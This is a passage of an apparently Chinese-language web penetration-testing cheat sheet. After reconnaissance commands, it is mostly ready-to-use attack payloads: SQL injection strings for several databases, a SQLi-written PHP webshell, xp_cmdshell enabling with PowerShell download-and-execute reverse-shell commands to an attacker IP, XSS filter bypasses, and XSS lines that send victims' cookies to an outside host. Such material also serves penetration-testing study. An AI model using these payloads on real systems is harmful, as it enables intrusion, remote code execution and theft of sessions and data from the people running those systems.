<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">ffuf -u <span class="hljs-string">&quot;https://site.com/index.php?FUZZ=ok&quot;</span> -w wordlist.txt -fs xxx<br></code></pre></td></tr></table></figure>

<p>模糊测试参数 POST</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">ffuf -u <span class="hljs-string">&quot;https://site.com/index.php&quot;</span> -X POST -d <span class="hljs-string">&#x27;FUZZ=ok&#x27;</span> -H <span class="hljs-string">&#x27;Content-Type: application/x-www-form-urlencoded&#x27;</span> -w wordlist.txt -fs xxx<br></code></pre></td></tr></table></figure>

<p><code>https://github.com/danielmiessler/SecLists</code></p>
<h3 id="Nikto-Web-服务器扫描仪"><a href="#Nikto-Web-服务器扫描仪" class="headerlink" title="Nikto - Web 服务器扫描仪"></a>Nikto - Web 服务器扫描仪</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">nikto -h http:<span class="hljs-comment">//site.com</span><br></code></pre></td></tr></table></figure>

<h3 id="HTTP-枚举-Nmap"><a href="#HTTP-枚举-Nmap" class="headerlink" title="HTTP 枚举 Nmap"></a>HTTP 枚举 Nmap</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">nmap -p80 --script=http-<span class="hljs-keyword">enum</span> &lt;IP&gt;<br></code></pre></td></tr></table></figure>

<h3 id="内容管理系统"><a href="#内容管理系统" class="headerlink" title="内容管理系统"></a>内容管理系统</h3><h4 id="WordPress"><a href="#WordPress" class="headerlink" title="WordPress"></a>WordPress</h4><p>wpscan</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">wpscan --url http:<span class="hljs-comment">//site.com/wordpress --api-token &lt;your_token&gt; --enumerate u,vp --plugins-detection aggressive</span><br>wpscan --url http:<span class="hljs-comment">//site.com/wordpress --api-token &lt;your_token&gt; --enumerate u,ap</span><br></code></pre></td></tr></table></figure>

<h4 id="juumla"><a href="#juumla" class="headerlink" title="juumla"></a>juumla</h4><p>尤姆拉</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">python main.py -u &lt;target&gt;<br></code></pre></td></tr></table></figure>

<p><code>https://github.com/oppsec/juumla</code></p>
<h4 id="droopescan"><a href="#droopescan" class="headerlink" title="droopescan"></a>droopescan</h4><p>drupal扫描</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">droopescan scan drupal -u &lt;target&gt; -t <span class="hljs-number">32</span><br></code></pre></td></tr></table></figure>

<p><code>https://github.com/SamJoan/droopescan</code></p>
<h4 id="magescan"><a href="#magescan" class="headerlink" title="magescan"></a>magescan</h4><p>磁扫描</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">php magescan.phar scan:all www.example.com<br></code></pre></td></tr></table></figure>

<p><code>https://github.com/steverobbins/magescan</code></p>
<h1 id="八、WEB应用攻击"><a href="#八、WEB应用攻击" class="headerlink" title="八、WEB应用攻击"></a>八、WEB应用攻击</h1><h2 id="SQL-注入-MySQL-MariaDB"><a href="#SQL-注入-MySQL-MariaDB" class="headerlink" title="SQL 注入 - MySQL&#x2F;MariaDB"></a>SQL 注入 - MySQL&#x2F;MariaDB</h2><p>绕过身份验证</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-string">&#x27; or 1=1 -- -</span><br><span class="hljs-string">admin&#x27;</span> -- -<br><span class="hljs-string">&#x27; or 1=1 order by 2 -- -</span><br><span class="hljs-string">&#x27;</span> or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> order by <span class="hljs-number">1</span> desc -- - <br><span class="hljs-string">&#x27; or 1=1 limit 1,1 -- -</span><br></code></pre></td></tr></table></figure>

<p>获取数字列</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">-1</span> order by <span class="hljs-number">3</span>;#<br></code></pre></td></tr></table></figure>

<p>获取版本</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">-1</span> <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,2,<span class="hljs-title">version</span>();</span>#<br></code></pre></td></tr></table></figure>

<p>获取数据库名称</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">-1</span> <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,2,<span class="hljs-title">database</span>();</span>#<br></code></pre></td></tr></table></figure>

<p>获取表名</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">-1</span> <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,2, <span class="hljs-title">group_concat</span>(<span class="hljs-title">table_name</span>) <span class="hljs-title">from</span> <span class="hljs-title">information_schema</span>.<span class="hljs-title">tables</span> <span class="hljs-title">where</span> <span class="hljs-title">table_schema</span>=</span><span class="hljs-string">&quot;&lt;database_name&gt;&quot;</span>;#<br></code></pre></td></tr></table></figure>

<p> 获取列名</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">-1</span> <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,2, <span class="hljs-title">group_concat</span>(<span class="hljs-title">column_name</span>) <span class="hljs-title">from</span> <span class="hljs-title">information_schema</span>.<span class="hljs-title">columns</span> <span class="hljs-title">where</span> <span class="hljs-title">table_schema</span>=</span><span class="hljs-string">&quot;&lt;database_name&gt;&quot;</span> and table_name=<span class="hljs-string">&quot;&lt;table_name&gt;&quot;</span>;#<br></code></pre></td></tr></table></figure>

<p>转储</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">-1</span> <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,2, <span class="hljs-title">group_concat</span>(&lt;</span>column_names&gt;) from &lt;database_name&gt;.&lt;table_name&gt;;#<br></code></pre></td></tr></table></figure>

<h3 id="通过-SQLI-的-Webshell"><a href="#通过-SQLI-的-Webshell" class="headerlink" title="通过 SQLI 的 Webshell"></a>通过 SQLI 的 Webshell</h3><p>查看Web服务器路径</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">LOAD_FILE(<span class="hljs-string">&#x27;/etc/httpd/conf/httpd.conf&#x27;</span>)    <br></code></pre></td></tr></table></figure>

<p>创建 webshell</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">select <span class="hljs-string">&quot;&lt;?php system($_GET[&#x27;cmd&#x27;]);?&gt;&quot;</span> into outfile <span class="hljs-string">&quot;/var/www/html/shell.php&quot;</span>;<br></code></pre></td></tr></table></figure>

<h3 id="通过-SQLI-读取文件-MySQL"><a href="#通过-SQLI-读取文件-MySQL" class="headerlink" title="通过 SQLI 读取文件 - MySQL"></a>通过 SQLI 读取文件 - MySQL</h3><p>例如</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">SELECT <span class="hljs-title function_">LOAD_FILE</span><span class="hljs-params">(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>)</span><br></code></pre></td></tr></table></figure>

<h2 id="Oracle-SQL"><a href="#Oracle-SQL" class="headerlink" title="Oracle SQL"></a>Oracle SQL</h2><p>绕过身份验证</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-string">&#x27; or 1=1--</span><br></code></pre></td></tr></table></figure>

<p>获取数字列</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-string">&#x27; order by 3--</span><br></code></pre></td></tr></table></figure>

<p>获取表名</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-string">&#x27; union select null,table_name,null from all_tables--</span><br></code></pre></td></tr></table></figure>

<p>获取列名</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-string">&#x27; union select null,column_name,null from all_tab_columns where table_name=&#x27;</span>&lt;table_name&gt;<span class="hljs-string">&#x27;--</span><br></code></pre></td></tr></table></figure>

<p>转储</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-string">&#x27; union select null,PASSWORD||USER_ID||USER_NAME,null from WEB_USERS--</span><br></code></pre></td></tr></table></figure>

<h2 id="SQLite注入"><a href="#SQLite注入" class="headerlink" title="SQLite注入"></a>SQLite注入</h2><p>提取表名，不显示标准 sqlite 表</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">http:<span class="hljs-comment">//site.com/index.php?id=-1 union select 1,2,3,group_concat(tbl_name),4 FROM sqlite_master WHERE type=&#x27;table&#x27; and tbl_name NOT like &#x27;sqlite_%&#x27;--</span><br></code></pre></td></tr></table></figure>

<p>提取表用户</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">http:<span class="hljs-comment">//site.com/index.php?id=-1 union select 1,2,3,group_concat(password),5 FROM users--</span><br></code></pre></td></tr></table></figure>

<p>参考: <code>https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf</code></p>
<h2 id="MSSQL注入"><a href="#MSSQL注入" class="headerlink" title="MSSQL注入"></a>MSSQL注入</h2><p>绕过身份验证</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-string">&#x27; or 1=1--</span><br></code></pre></td></tr></table></figure>

<p>获取版本+延迟</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-string">&#x27; SELECT @@version; WAITFOR DELAY &#x27;</span><span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">10&#x27;</span>; —<br></code></pre></td></tr></table></figure>

<p>启用 xp_cmdshell</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-string">&#x27; UNION SELECT 1, null; EXEC sp_configure &#x27;</span>show advanced options<span class="hljs-number">&#x27;</span>, <span class="hljs-number">1</span>; RECONFIGURE; EXEC sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-number">1</span>; RECONFIGURE;--<br></code></pre></td></tr></table></figure>

<p>远程代码执行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-string">&#x27; exec xp_cmdshell &quot;powershell IEX (New-Object Net.WebClient).DownloadString(&#x27;</span>http:<span class="hljs-comment">//&lt;ip&gt;/InvokePowerShellTcp.ps1&#x27;)&quot; ;--</span><br></code></pre></td></tr></table></figure>

<p><code>https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1</code></p>
<h2 id="滥用MSSQL"><a href="#滥用MSSQL" class="headerlink" title="滥用MSSQL"></a>滥用MSSQL</h2><p>编辑 Invoke-PowerShellTcp.ps1，添加以下内容：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">Invoke-PowerShellTcp -Reverse -IPAddress <span class="hljs-number">192.168</span><span class="hljs-number">.254</span><span class="hljs-number">.226</span> -Port <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">impacket-mssqlclient &lt;user&gt;@&lt;ip&gt; -db &lt;database&gt;<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">xp_cmdshell powershell <span class="hljs-title function_">IEX</span><span class="hljs-params">(New-Object Net.webclient)</span>.<span class="hljs-title function_">downloadString</span><span class="hljs-params">(\<span class="hljs-string">&quot;http://&lt;ip&gt;/Invoke-PowerShellTcp.ps1\&quot;)</span></span><br></code></pre></td></tr></table></figure>

<p><code>https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1</code></p>
<h2 id="跨站脚本攻击-XSS"><a href="#跨站脚本攻击-XSS" class="headerlink" title="跨站脚本攻击(XSS)"></a>跨站脚本攻击(XSS)</h2><p>1-&gt; 确定所使用的语言和框架<br>2-&gt; 确定入口点（参数、输入、反映您可以控制的值的响应等）<br>3-&gt; 通过源代码预览或浏览器开发工具检查这如何反映在响应中<br>4- &gt; &gt; 检查允许的特殊字符</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt; &gt; <span class="hljs-string">&#x27; &quot; &#123; &#125; ;</span><br></code></pre></td></tr></table></figure>

<p>5-&gt; 检测是否有过滤器或堵塞物并根据需要进行修改以使其正常工作</p>
<h3 id="XSS-绕过的词汇表"><a href="#XSS-绕过的词汇表" class="headerlink" title="XSS 绕过的词汇表"></a>XSS 绕过的词汇表</h3><p><code>https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/wordlists/xss_bypass.txt</code><br><code>https://gist.githubusercontent.com/rvrsh3ll/09a8b933291f9f98e8ec/raw/535cd1a9cefb221dd9de6965e87ca8a9eb5dc320/xxsfilterbypass.lst</code><br><code>https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/XSS-Bypass-Strings-BruteLogic.txt</code><br><code>https://raw.githubusercontent.com/payloadbox/xss-payload-list/master/Intruder/xss-payload-list.txt</code><br><code>https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/XSS-Cheat-Sheet-PortSwigger.txt</code></p>
<h3 id="XSS-审核器和-XSS-过滤器"><a href="#XSS-审核器和-XSS-过滤器" class="headerlink" title="XSS 审核器和 XSS 过滤器"></a>XSS 审核器和 XSS 过滤器</h3><p><code>https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md</code><br><code>https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html</code><br><code>https://www.chromium.org/developers/design-documents/xss-auditor/</code><br><code>https://portswigger.net/daily-swig/xss-protection-disappears-from-microsoft-edge</code><br><code>https://developer.mozilla.org/pt-BR/docs/Web/HTTP/Headers/X-XSS-Protection</code></p>
<h3 id="XSS-键盘记录器"><a href="#XSS-键盘记录器" class="headerlink" title="XSS 键盘记录器"></a>XSS 键盘记录器</h3><p><code>https://rapid7.com/blog/post/2012/02/21/metasploit-javascript-keylogger/</code><br><code>https://github.com/hadynz/xss-keylogger</code></p>
<h3 id="XSS突变"><a href="#XSS突变" class="headerlink" title="XSS突变"></a>XSS突变</h3><p><code>http://www.businessinfo.co.uk/labs/mxss/</code></p>
<h3 id="XSS-多语言"><a href="#XSS-多语言" class="headerlink" title="XSS 多语言"></a>XSS 多语言</h3><p><code>https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot</code></p>
<h3 id="正则表达式黑名单过滤"><a href="#正则表达式黑名单过滤" class="headerlink" title="正则表达式黑名单过滤"></a>正则表达式黑名单过滤</h3><p>过滤器阻塞开启 - 绕过<br><code>(on\w+\s*=)</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;svg onload%<span class="hljs-number">09</span>=alert(<span class="hljs-number">1</span>)&gt; <br>&lt;svg %<span class="hljs-number">09</span>onload%<span class="hljs-number">20</span>=alert(<span class="hljs-number">1</span>)&gt;<br>&lt;svg onload%<span class="hljs-number">09</span>%<span class="hljs-number">20</span>%<span class="hljs-number">28</span>%<span class="hljs-number">2</span>C%<span class="hljs-number">3B</span>=alert(<span class="hljs-number">1</span>)&gt;<br>&lt;svg onload%<span class="hljs-number">0B</span>=alert(<span class="hljs-number">1</span>)&gt;<br></code></pre></td></tr></table></figure>

<h3 id="基于关键字的过滤器"><a href="#基于关键字的过滤器" class="headerlink" title="基于关键字的过滤器"></a>基于关键字的过滤器</h3><h4 id="警报被阻止-绕过"><a href="#警报被阻止-绕过" class="headerlink" title="警报被阻止 - 绕过"></a>警报被阻止 - 绕过</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;script&gt;\u0061lert(<span class="hljs-number">1</span>)&lt;/script&gt;<br>&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(<span class="hljs-number">1</span>)&lt;/script&gt;<br>&lt;script&gt;eval(<span class="hljs-string">&quot;\u0061lert(1)&quot;</span>)&lt;/script&gt;  <br>&lt;script&gt;eval(<span class="hljs-string">&quot;\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029&quot;</span>)&lt;/script&gt;<br></code></pre></td></tr></table></figure>

<h4 id="删除脚本标签-绕过"><a href="#删除脚本标签-绕过" class="headerlink" title="删除脚本标签 - 绕过"></a>删除脚本标签 - 绕过</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;sCR&lt;script&gt;iPt&gt;alert(<span class="hljs-number">1</span>)&lt;/SCr&lt;/script&gt;IPt&gt;<br></code></pre></td></tr></table></figure>

<h3 id="字符转义绕过"><a href="#字符转义绕过" class="headerlink" title="字符转义绕过"></a>字符转义绕过</h3><h4 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h4><p>String.fromCharCode()<br>转义</p>
<p>例如<br>解码 URI + unescape 方法（需要 eval）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">decodeURI(/alert(%<span class="hljs-number">22</span>xss%<span class="hljs-number">22</span>)/.source)<br>decodeURIComponent(/alert(%<span class="hljs-number">22</span>xss%<span class="hljs-number">22</span>)/.source)<br></code></pre></td></tr></table></figure>

<h3 id="其他旁路技术"><a href="#其他旁路技术" class="headerlink" title="其他旁路技术"></a>其他旁路技术</h3><p>统一码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;img src=x onerror=<span class="hljs-string">&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;</span>/&gt;<br></code></pre></td></tr></table></figure>

<p>添加执行接收器：<br>-&gt; eval<br>-&gt; setInterval<br>-&gt; setTimeout</p>
<p>-&gt; 八进制</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;img src=x onerror=<span class="hljs-string">&quot;eval(&#x27;\141lert(1)&#x27;)&quot;</span>/&gt;<br></code></pre></td></tr></table></figure>

<p>-&gt; 十六进制</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;img src=x onerror=<span class="hljs-string">&quot;setInterval(&#x27;\x61lert(1)&#x27;)&quot;</span>/&gt;<br></code></pre></td></tr></table></figure>

<p>-&gt; 混合（uni、hex、octa）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;img src=x onerror=<span class="hljs-string">&quot;setTimeout(&#x27;\x61\154\145\x72\164\x28\x31\x29&#x27;)&quot;</span>/&gt;<br></code></pre></td></tr></table></figure>

<p><code>https://checkserp.com/encode/unicode/</code><br><code>http://www.unit-conversion.info/texttools/octal/</code><br><code>http://www.unit-conversion.info/texttools/hexadecimal/</code></p>
<h3 id="其他例子"><a href="#其他例子" class="headerlink" title="其他例子"></a>其他例子</h3><h4 id="HTML标签"><a href="#HTML标签" class="headerlink" title="HTML标签"></a>HTML标签</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;div&gt;here&lt;/div&gt;<br></code></pre></td></tr></table></figure>
<p>-&gt;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;svg/onload=alert(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>

<h4 id="HTML-标签属性"><a href="#HTML-标签属性" class="headerlink" title="HTML 标签属性"></a>HTML 标签属性</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;input value=<span class="hljs-string">&quot;here&quot;</span>/&gt;&lt;/input&gt;<br></code></pre></td></tr></table></figure>
<p>-&gt;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-string">&quot; /&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></code></pre></td></tr></table></figure>

<h4 id="脚本标签"><a href="#脚本标签" class="headerlink" title="脚本标签"></a>脚本标签</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;script&gt;<br>    var name=<span class="hljs-string">&quot;here&quot;</span>;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
<p>-&gt;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-string">&quot;;alert(1);//</span><br></code></pre></td></tr></table></figure>

<h4 id="事件属性"><a href="#事件属性" class="headerlink" title="事件属性"></a>事件属性</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;button onclick=<span class="hljs-string">&quot;here;&quot;</span>&gt;Okay!&lt;/button&gt;<br></code></pre></td></tr></table></figure>
<p>-&gt;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">alert(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>

<h4 id="基于Dom"><a href="#基于Dom" class="headerlink" title="基于Dom"></a>基于Dom</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;script&gt;var ok = location.search.replace(<span class="hljs-string">&quot;?ok=&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);domE1.innerHTML = <span class="hljs-string">&quot;&lt;a href=\&#x27;&quot;</span>+ok+<span class="hljs-string">&quot;\&#x27;&gt;ok&lt;/a&gt;&quot;</span>;&lt;/script&gt;<br></code></pre></td></tr></table></figure>
<p>-&gt;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">javascript:alert(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>

<h3 id="JavaScript-编码"><a href="#JavaScript-编码" class="headerlink" title="JavaScript 编码"></a>JavaScript 编码</h3><p>-&gt; jjencode<br><code>https://utf-8.jp/public/jjencode.html</code><br>-&gt; aaencode<br><code>https://utf-8.jp/public/aaencode.html</code><br>-&gt; jsfuck<br><code>http://www.jsfuck.com/</code><br>- &gt; Xchars.js<br><code>https://syllab.fr/projets/experiments/xcharsjs/5chars.pipeline.html</code></p>
<h3 id="解码器-混淆（Javascript-解码器和-PHP）"><a href="#解码器-混淆（Javascript-解码器和-PHP）" class="headerlink" title="解码器 - 混淆（Javascript 解码器和 PHP）"></a>解码器 - 混淆（Javascript 解码器和 PHP）</h3><p><code>https://malwaredecoder.com/</code></p>
<h3 id="XSS-到-LFI"><a href="#XSS-到-LFI" class="headerlink" title="XSS 到 LFI"></a>XSS 到 LFI</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;img src=x onerror=<span class="hljs-string">&quot;document.write(&#x27;&lt;iframe src=file:///etc/passwd&gt;&lt;/iframe&gt;&#x27;)&quot;</span>/&gt;<br>&lt;script&gt;document.write(<span class="hljs-string">&#x27;&lt;iframe src=file:///etc/passwd&gt;&lt;/iframe&gt;&#x27;</span>);&lt;/script&gt;<br></code></pre></td></tr></table></figure>

<h3 id="XSS-会话劫持"><a href="#XSS-会话劫持" class="headerlink" title="XSS-会话劫持"></a>XSS-会话劫持</h3><p>示例</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;script&gt;new Image().src=<span class="hljs-string">&quot;http://&lt;IP&gt;/ok.jpg?output=&quot;</span>+document.cookie;&lt;/script&gt;<br>&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;document.location=<span class="hljs-string">&quot;http://&lt;IP&gt;/?cookie=&quot;</span>+document.cookie;&lt;/script&gt;  <br>&lt;script&gt;window.location=<span class="hljs-string">&quot;http://&lt;IP&gt;/?cookie=&quot;</span>+document.cookie;&lt;/script&gt;<br>&lt;script&gt;document.location=<span class="hljs-string">&quot;http://&lt;IP&gt;/?cookie=&quot;</span>+document.cookie;&lt;/script&gt;  <br>&lt;script&gt;fetch(<span class="hljs-string">&#x27;http://&lt;IP&gt;/?cookie=&#x27;</span> + btoa(document.cookie));&lt;/script&gt;  <br></code></pre></td></tr></table></figure>

<h3 id="模板-细胞核"><a href="#模板-细胞核" class="headerlink" title="模板 - 细胞核"></a>模板 - 细胞核</h3><p><code>https://raw.githubusercontent.com/esetal/nuclei-bb-templates/master/xss-fuzz.yaml</code></p>
<h2 id="Git-信息泄露攻击"><a href="#Git-信息泄露攻击" class="headerlink" title="Git 信息泄露攻击"></a>Git 信息泄露攻击</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">git-dumper http:<span class="hljs-comment">//site.com/.git .</span><br></code></pre></td></tr></table></figure>

<p><code>https://github.com/arthaud/git-dumper</code></p>
<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p><code>https://github.com/internetwache/GitTools</code></p>
<h2 id="损坏的访问控制-IDOR（不安全的直接对象引用）"><a href="#损坏的访问控制-IDOR（不安全的直接对象引用）" class="headerlink" title="损坏的访问控制 - IDOR（不安全的直接对象引用）"></a>损坏的访问控制 - IDOR（不安全的直接对象引用）</h2><ol>
<li>搜索请求中的 ID 列表，如果找不到，请创建至少两个帐户并分析涉及 ID 的请求</li>
<li>识别应用程序中的访问控制</li>
<li>更改请求方法（GET、POST、PUT、DELETE、PATCH…）</li>
<li>搜索旧版本 API 的 &#x2F;api&#x2F;v1&#x2F; &#x2F;api&#x2F;v2&#x2F; &#x2F;api&#x2F;v3&#x2F;</li>
<li>尝试发送 (*) 而不是 ID，尤其是在搜索点</li>
<li>取决于上下文和可预测性的强力 ID</li>
</ol>
<h3 id="IDOR-参数污染"><a href="#IDOR-参数污染" class="headerlink" title="IDOR+参数污染"></a>IDOR+参数污染</h3><h4 id="HTTP参数污染"><a href="#HTTP参数污染" class="headerlink" title="HTTP参数污染"></a>HTTP参数污染</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">GET /api/v1/messages?id=&lt;Another_User_ID&gt; <span class="hljs-meta"># unauthourized</span><br>GET /api/v1/messages?id=&lt;You_User_ID&gt;&amp;id=&lt;Another_User_ID&gt; <span class="hljs-meta"># authorized</span><br>GET /api/v1/messages?id[]=&lt;Your_User_ID&gt;&amp;id[]=&lt;Another_User_ID&gt;<br></code></pre></td></tr></table></figure>

